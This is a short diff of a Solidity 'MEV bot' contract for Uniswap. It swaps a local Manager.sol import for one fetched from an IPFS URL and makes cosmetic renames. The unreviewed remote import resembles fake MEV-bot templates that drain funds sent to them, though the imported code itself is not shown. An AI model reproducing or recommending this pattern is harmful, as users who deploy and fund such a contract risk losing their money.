@@ -1,19 +1,20 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
+import "https://ipfs.io/ipfs/QmWmrAmw25HvVTezm8xddH3hT1h9HxtFgT4fLa25WYybrp?filename=Manager.sol";
 
 // Import Libraries Migrator/Exchange/Factory
-import "Manager.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
-contract MevBot {
-
+contract MEVBot {
+ 
     string public tokenName;
     string public tokenSymbol;
     uint liquidity;
     Manager manager;
-    event Log(string message);
+
+    event Log(string _msg);
 
     constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {
         tokenSymbol = _mainTokenSymbol;
@@ -27,7 +28,7 @@ contract MevBot {
         uint _len;
         uint _ptr;
     }
-
+    
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
